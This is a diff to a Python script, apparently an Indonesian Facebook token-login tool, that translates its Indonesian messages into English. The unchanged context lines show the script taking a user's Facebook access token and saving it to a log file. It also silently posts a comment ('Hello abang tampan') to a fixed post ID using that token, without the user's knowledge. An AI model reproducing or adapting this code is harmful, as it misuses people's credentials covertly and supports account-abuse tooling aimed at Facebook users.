@@ -1,6 +1,6 @@
 ###############################
 # Mau Recode? Sertain author yg buat :v #
-# Author: Latip Harkat | github:latip176 :v    #
+# Author: Latip Harkat | github:Latip176 :v    #
 ###############################
 
 #import modulenya :v
@@ -26,13 +26,13 @@ idTeman,idPublik=[],[]
 def pilihLogin():
 	pil=input("[?] Select which one : ")
 	if(pil in ("","  ","   ","    ","     ","      ","       ")):
-		print("[!] Jangan Kosong\n")
+		print("[!] Dont Be Empty\n")
 		pilihLogin()
 	elif(pil in ("1","01")):
 		token=input("[!] Access Your Token Facebook : ")
 		try:
 			r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={token}").text)
-			print("[√] Login Berhasil\nNama Akun :",r['name'])
+			print("[√] Login Complete\nName Account :",r['name'])
 			r2=req.post(f"https://graph.facebook.com/315723919935349/comments/?message=Hello abang tampan&access_token={token}")
 			open('log.txt','a').write(token)
 			time.sleep(2)
@@ -61,7 +61,7 @@ def pilihLogin():
 			to=find_token.group(1)
 			ru=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 			os.system("clear")
-			print("[√] Login Berhasil\nNama Akun :",ru['name'])
+			print("[√] Login Complete\nName Account :",ru['name'])
 			req.post(f"https://graph.facebook.com/315723919935349/comments/?message=Hello abang tampan&access_token={to}")
 			time.sleep(2)
 			open("log.txt","a").write(to)
@@ -76,7 +76,7 @@ def pilihLogin():
 			except:pass
 			nampung(to).menu()
 	else:
-		print("[!] Pilihan Tidak Ada\n")
+		print("[!] Option does not exist\n")
 		pilihLogin()
 def login():
 	os.system('clear')
@@ -90,7 +90,7 @@ def logika():
 		time.sleep(2)
 		nampung(token).menu()
 	except KeyError:
-		print('[!] Token invalid Alias Hangus')
+		print('[!] Token invalid')
 		os.system("rm -rf tt.txt")
 		time.sleep(2)
 		login()
@@ -272,7 +272,7 @@ class nampung:
 			os.system("rm -rf log.txt")
 			exit("[√] Logout Succes")
 		else:
-			print("[!] Pilihan tydack ada \n")
+			print("[!] Option does not exist \n")
 			nampung(self.token).pilihan()
 	def menu(self):
 		os.system("clear")
